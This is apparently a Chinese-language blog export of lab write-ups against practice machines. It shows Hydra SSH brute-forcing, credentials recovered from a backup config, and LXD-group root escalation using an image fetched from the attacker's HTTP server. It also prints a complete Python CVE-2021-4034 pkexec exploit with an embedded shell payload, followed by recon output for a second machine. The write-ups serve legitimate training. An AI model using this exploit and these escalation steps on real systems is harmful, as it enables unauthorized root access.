<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -l jubiscleudo -P pass.txt ssh://<span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span></span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">07</span>:<span class="number">33</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Many SSH configurations <span class="keyword">limit</span> the number <span class="keyword">of</span> parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">300</span> <span class="keyword">login</span> tries (l:<span class="number">1</span>/p:<span class="number">300</span>), ~<span class="number">19</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span>:<span class="number">22</span>/</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span>   <span class="keyword">login</span>: jubiscleudo   <span class="keyword">password</span>: onlymy</span><br><span class="line">[STATUS] <span class="number">300.00</span> tries/min, <span class="number">300</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">5</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">7</span> active</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Writing restore file because <span class="number">5</span> final worker threads did <span class="keyword">not</span> complete <span class="keyword">until</span> <span class="keyword">end</span>.</span><br><span class="line">[ERROR] <span class="number">5</span> targets did <span class="keyword">not</span> resolve <span class="keyword">or</span> could <span class="keyword">not</span> be connected</span><br><span class="line">[ERROR] <span class="number">0</span> target did <span class="keyword">not</span> complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">36</span></span><br></pre></td></tr></table></figure></div>
<p>成功拿到shell jubiscleudo&#x2F;onlymy<br>这里还有一种可以用ipv6绕过knock的方法，详情可以看群主ll104567的视频<a href="https://space.bilibili.com/20805349?spm_id_from=333.1387.follow.user_card.click">https://space.bilibili.com/20805349?spm_id_from=333.1387.follow.user_card.click</a></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>用linpeas.sh来找找有什么可以利用的<br>发现了在&#x2F;var&#x2F;www&#x2F;html&#x2F;.backup_config.php里有hackable_3用户的密码<br><img src="https://pic1.imgdb.cn/item/67ab377ad0e0a243d4fe613a.png"><br>切换用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hackable_3</span>@ubuntu20:~$ id</span><br><span class="line"><span class="attribute">uid</span>=<span class="number">1000</span>(hackable_3) gid=<span class="number">1000</span>(hackable_3) groups=<span class="number">1000</span>(hackable_3),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">116</span>(lxd)</span><br></pre></td></tr></table></figure></div>
<p>根据群主在群里发的文件知道lxd是可以提权的<br>LXD 是一个 root 进程，它负责执行任意用户的 LXD UNIX 套接字写入访问操作。而且在某些情况下，LXD 甚至都不会调用它的用户权限进行检查和匹配</p>
<p>Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于 Chroot 和完整开发的虚拟机之间，LXC 可以创建一个跟正常 Linux 操作系统十分接近的环境，但是不需要使用到单独的内核资源。</p>
<p>Linux Daemon（LXD）是一个轻量级容器管理程序，而 LXD 是基于 LXC 容器技术实现的，而这种技术之前 Docker 也使用过。LXD 使用了稳定的 LXC API 来完成所有的后台容器管理工作，并且增加了 REST API 支持，更进一步地提升了用户体验度。</p>
<p>在网上搜lxd提权<br>先下载利用的程序 <a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a><br>然后开http_server服务让靶机用wget能接受</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─<span class="comment"># scp kakeru@192.168.179.82:Downloads/lxd-alpine-builder-master.zip .</span></span><br><span class="line">(kakeru@<span class="number">192.168</span>.<span class="number">179.82</span>) <span class="params">Password:</span></span><br><span class="line">lxd-alpine-builder-master.zip                                                    <span class="number">100</span>% <span class="number">3175</span>KB <span class="number">116.0</span>MB<span class="symbol">/s</span>   <span class="number">00</span>:<span class="number">00</span>    </span><br><span class="line">                              </span><br></pre></td></tr></table></figure></div>
<p>跟着网上lxd提权的步骤<a href="https://www.cnblogs.com/jhinjax/p/17078938.html%EF%BC%8C">https://www.cnblogs.com/jhinjax/p/17078938.html，</a><br>接受文件后，初始化，一路回车</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp<span class="operator">/</span>lxd<span class="operator">-</span>alpine<span class="operator">-</span>builder<span class="operator">-</span>master]</span><br><span class="line">└─# python3 <span class="operator">-</span>m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">80</span> (http:<span class="operator">/</span><span class="operator">/</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">80</span><span class="operator">/</span>) ...</span><br><span class="line"></span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ ls</span><br><span class="line">alpine<span class="operator">-</span>v3<span class="number">.13</span><span class="operator">-</span>x86_64<span class="number">-20210218</span>_0139.tar.gz  snap</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxd init</span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> use LXD clustering? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Do you want <span class="keyword">to</span> configure a <span class="keyword">new</span> storage pool? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes]: </span><br><span class="line"></span><br><span class="line">Name <span class="keyword">of</span> the <span class="keyword">new</span> storage pool [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">default</span>]: Name <span class="keyword">of</span> the storage backend <span class="keyword">to</span> use (ceph, btrfs, dir, lvm) [<span class="keyword">default</span><span class="operator">=</span>btrfs]: </span><br><span class="line"><span class="keyword">Create</span> a <span class="keyword">new</span> BTRFS pool? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes]: </span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> use an existing <span class="keyword">empty</span> block device (e.g. a disk <span class="keyword">or</span> <span class="keyword">partition</span>)? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Size <span class="keyword">in</span> GB <span class="keyword">of</span> the <span class="keyword">new</span> loop device (<span class="number">1</span>GB minimum) [<span class="keyword">default</span><span class="operator">=</span><span class="number">5</span>GB]: </span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> <span class="keyword">connect</span> <span class="keyword">to</span> a MAAS server? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">local</span> network bridge? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes]: </span><br><span class="line">What should the <span class="keyword">new</span> bridge be <span class="keyword">called</span>? [<span class="keyword">default</span><span class="operator">=</span>lxdbr0]: </span><br><span class="line">What IPv4 address should be used? (CIDR subnet notation, “auto” <span class="keyword">or</span> “<span class="keyword">none</span>”) [<span class="keyword">default</span><span class="operator">=</span>auto]: </span><br><span class="line">What IPv6 address should be used? (CIDR subnet notation, “auto” <span class="keyword">or</span> “<span class="keyword">none</span>”) [<span class="keyword">default</span><span class="operator">=</span>auto]: </span><br><span class="line">Would you <span class="keyword">like</span> the LXD server <span class="keyword">to</span> be available <span class="keyword">over</span> the network? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Would you <span class="keyword">like</span> stale cached images <span class="keyword">to</span> be updated automatically? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes] </span><br><span class="line">Would you <span class="keyword">like</span> a YAML &quot;lxd init&quot; preseed <span class="keyword">to</span> be printed? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc image import alpine<span class="operator">-</span>v3<span class="number">.13</span><span class="operator">-</span>x86_64<span class="number">-20210218</span>_0139.tar.gz <span class="comment">--alias  image_name</span></span><br><span class="line">Image imported <span class="keyword">with</span> fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc init image_name ignite <span class="operator">-</span>c security.privileged<span class="operator">=</span><span class="literal">true</span></span><br><span class="line">Creating ignite</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc config device <span class="keyword">add</span> ignite mydevice disk source<span class="operator">=</span><span class="operator">/</span> path<span class="operator">=</span><span class="operator">/</span>mnt<span class="operator">/</span>root <span class="keyword">recursive</span><span class="operator">=</span><span class="literal">true</span></span><br><span class="line">Device mydevice added <span class="keyword">to</span> ignite</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc <span class="keyword">start</span> ignite</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc <span class="keyword">exec</span> ignite <span class="operator">/</span>bin<span class="operator">/</span>sh</span><br><span class="line"><span class="operator">~</span> # id</span><br><span class="line">uid<span class="operator">=</span><span class="number">0</span>(root) gid<span class="operator">=</span><span class="number">0</span>(root)</span><br></pre></td></tr></table></figure></div>
<p>原理<br>lxd 组用户可以以任意镜像创建容器，并将当前系统根目录挂载到已创建容器的 mnt 目录下，&#x2F;mnt&#x2F;root&#x2F; 目录是一个完整的根目录，可以使用 chroot 获取到这个根目录的完整 root 权限。<br>所以现在查文件就在&#x2F;mnt&#x2F;root目录下面</p>
<h2 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h2><p>刚才用linpeas.sh扫描的时候扫出一个漏洞<br><img src="https://pic1.imgdb.cn/item/67ab4752d0e0a243d4fe6489.png"><br>可以找到pkexec的漏洞利用脚本，不过不是这里显示的两个，是CVE-2021-4034<br>这里我们选择用py脚本，不用先编译，方便而且在靶机上成功率高</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2021-4034 in Python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Joe Ammond (joe@ammond.org)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This was just an experiment to see whether I could get this to work</span></span><br><span class="line"><span class="comment"># in Python, and to play around with ctypes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This was completely cribbed from blasty&#x27;s original C code:</span></span><br><span class="line"><span class="comment"># https://haxx.in/files/blasty-vs-pkexec.c</span></span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">from ctypes import *</span><br><span class="line">from ctypes.util import find_library</span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload, base64 encoded ELF shared object. Generate with:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The PrependSetuid=true is important, without it you&#x27;ll just get</span></span><br><span class="line"><span class="comment"># a shell as the user and not root.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Should work with any msfvenom payload, tested with linux/x64/exec</span></span><br><span class="line"><span class="comment"># and linux/x64/shell_reverse_tcp</span></span><br><span class="line"></span><br><span class="line">payload_b64 = <span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC</span></span><br><span class="line"><span class="string">AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ</span></span><br><span class="line"><span class="string">AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA</span></span><br><span class="line"><span class="string">AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA</span></span><br><span class="line"><span class="string">AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA</span></span><br><span class="line"><span class="string">AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = base64.b64decode(payload_b64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the environment for the call to execve()</span></span><br><span class="line">environ = [</span><br><span class="line">        <span class="string">b&#x27;exploit&#x27;</span>,</span><br><span class="line">        <span class="string">b&#x27;PATH=GCONV_PATH=.&#x27;</span>,</span><br><span class="line">        <span class="string">b&#x27;LC_MESSAGES=en_US.UTF-8&#x27;</span>,</span><br><span class="line">        <span class="string">b&#x27;XAUTHORITY=../LOL&#x27;</span>,</span><br><span class="line">        None</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find the C library to call execve() directly, as Python helpfully doesn&#x27;t</span></span><br><span class="line"><span class="comment"># allow us to call execve() with no arguments.</span></span><br><span class="line">try:</span><br><span class="line">    libc = CDLL(find_library(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Unable to find the C library, wtf?&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the shared library from the payload</span></span><br><span class="line">print(<span class="string">&#x27;[+] Creating shared library for exploit code.&#x27;</span>)</span><br><span class="line">try:</span><br><span class="line">    with open(<span class="string">&#x27;payload.so&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(payload)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed creating payload.so.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line">os.chmod(<span class="string">&#x27;payload.so&#x27;</span>, <span class="number">0</span>o0755)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make the GCONV_PATH directory</span></span><br><span class="line">try:</span><br><span class="line">    os.mkdir(<span class="string">&#x27;GCONV_PATH=.&#x27;</span>)</span><br><span class="line">except FileExistsError:</span><br><span class="line">    print(<span class="string">&#x27;[-] GCONV_PATH=. directory already exists, continuing.&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed making GCONV_PATH=. directory.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a temp exploit file</span></span><br><span class="line">try:</span><br><span class="line">    with open(<span class="string">&#x27;GCONV_PATH=./exploit&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed creating exploit file&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line">os.chmod(<span class="string">&#x27;GCONV_PATH=./exploit&#x27;</span>, <span class="number">0</span>o0755)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create directory to hold gconf-modules configuration file</span></span><br><span class="line">try:</span><br><span class="line">    os.mkdir(<span class="string">&#x27;exploit&#x27;</span>)</span><br><span class="line">except FileExistsError:</span><br><span class="line">    print(<span class="string">&#x27;[-] exploit directory already exists, continuing.&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed making exploit directory.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create gconf config file</span></span><br><span class="line">try:</span><br><span class="line">    with open(<span class="string">&#x27;exploit/gconv-modules&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(<span class="string">b&#x27;module  UTF-8//    INTERNAL    ../payload    2\n&#x27;</span>);</span><br><span class="line">except:</span><br><span class="line">    print(<span class="string">&#x27;[!] Failed to create gconf-modules config file.&#x27;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the environment to an array of char*</span></span><br><span class="line">environ_p = (c_char_p * len(environ))()</span><br><span class="line">environ_p[:] = environ</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;[+] Calling execve()&#x27;</span>)</span><br><span class="line"><span class="comment"># Call execve() with NULL arguments</span></span><br><span class="line">libc.execve(<span class="string">b&#x27;/usr/bin/pkexec&#x27;</span>, c_char_p(None), environ_p)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">jubiscleudo<span class="variable">@ubuntu20</span><span class="symbol">:~</span><span class="variable">$ </span>vi a.py</span><br><span class="line">jubiscleudo<span class="variable">@ubuntu20</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x a.py</span><br><span class="line">jubiscleudo<span class="variable">@ubuntu20</span><span class="symbol">:~</span><span class="variable">$ </span>./a.py</span><br><span class="line">[+] <span class="title class_">Creating</span> shared library <span class="keyword">for</span> exploit code.</span><br><span class="line">[+] <span class="title class_">Calling</span> execve()</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">1001</span>(jubiscleudo) groups=<span class="number">1001</span>(jubiscleudo)</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/jubiscleudo</span><br></pre></td></tr></table></figure></div>

<h2 id="提权详细过程"><a href="#提权详细过程" class="headerlink" title="提权详细过程"></a>提权详细过程</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#（1）获取 Alpine Linux 镜像</span></span><br><span class="line">wget http://攻击机IP/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#lxd初始化</span></span><br><span class="line">lxd init   <span class="comment">#一路回车</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后导入镜像：</span></span><br><span class="line">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span> image_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建特权容器</span></span><br><span class="line">lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#挂载宿主机的根目录</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动并进入容器</span></span><br><span class="line">lxc start ignite </span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到宿主机环境</span></span><br><span class="line"><span class="built_in">chroot</span> /mnt/root</span><br></pre></td></tr></table></figure></div>
<p>总结：学到了什么是lxd，以及用这个提权的方式，lxd提权后的目录在&#x2F;mnt&#x2F;root，以及内核提权的使用方式。<br>由于我是arm机器，前面在编译x86文件的时候还遇到问题，学会了交叉编译的工具x86_64-linux-gnu-gcc<br>以及在本机编译c语言需要用-static让编译出来的文件不用动态库，用脚本有py就不用c</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-insomnia</title>
    <url>/posts/50600.html</url>
    <content><![CDATA[<p>HMV-insomnia靶机复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67b1d5e6d0e0a243d4ffda75.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">nmap</span> -A <span class="number">192.168</span>.<span class="number">112.252</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">02</span>-<span class="number">16</span> <span class="number">20</span>:<span class="number">12</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">112.252</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0014</span>s latency).</span><br><span class="line">Not shown: <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">8080</span>/tcp <span class="keyword">open</span>  http    PHP cli server <span class="number">5.5</span> <span class="built_in">or</span> <span class="keyword">later</span> (PHP <span class="number">7.3</span>.<span class="number">19</span>-<span class="number">1</span>)</span><br><span class="line">|_http-<span class="keyword">open</span>-proxy: Proxy might <span class="keyword">be</span> redirecting requests</span><br><span class="line">|_http-title: Chat</span><br><span class="line">MAC Address: D2:<span class="number">24</span>:EE:B5:C6:<span class="number">9</span>D (Unknown)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|router</span><br><span class="line">Running: Linux <span class="number">4</span>.<span class="keyword">X</span>|<span class="number">5</span>.<span class="keyword">X</span>, MikroTik RouterOS <span class="number">7</span>.<span class="keyword">X</span></span><br><span class="line">OS CPE: cpe:/<span class="keyword">o</span>:linux:linux_kerne<span class="variable">l:4</span> cpe:/<span class="keyword">o</span>:linux:linux_kerne<span class="variable">l:5</span> cpe:/<span class="keyword">o</span>:mikrotik:routero<span class="variable">s:7</span> cpe:/<span class="keyword">o</span>:linux:linux_kerne<span class="variable">l:5</span>.<span class="number">6.3</span></span><br><span class="line">OS details: Linux <span class="number">4.15</span> - <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> - <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.36</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.252</span>)</span><br><span class="line"></span><br><span class="line">OS <span class="built_in">and</span> Service detection performed. Please report any incorrect results at https://<span class="keyword">nmap</span>.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">8.19</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>只开放8080端口是一个http服务，去web上面看看</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>给了一个输入框<br><img src="https://pic1.imgdb.cn/item/67b1d69ed0e0a243d4ffda8a.png"><br>然后目录扫描一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.112.252:8080 -e php,jpg,html,js,txt,bak -i 200,300-399</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, jpg, html, js, txt, bak | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span></span><br><span class="line">Wordlist <span class="params">size:</span> <span class="number">11988</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.112.252_8080/_25-02-16_20-21-37.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">112.252</span>:<span class="number">8080</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">37</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">48</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">65</span>B  <span class="operator">-</span> <span class="symbol">/administration.php</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">53</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">2</span>KB <span class="operator">-</span> <span class="symbol">/chat.js</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">53</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">3</span>B  <span class="operator">-</span> <span class="symbol">/chat.txt</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">22</span>:<span class="number">13</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">20</span>B  <span class="operator">-</span> <span class="symbol">/start.sh</span></span><br><span class="line"></span><br><span class="line">Task Completed</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

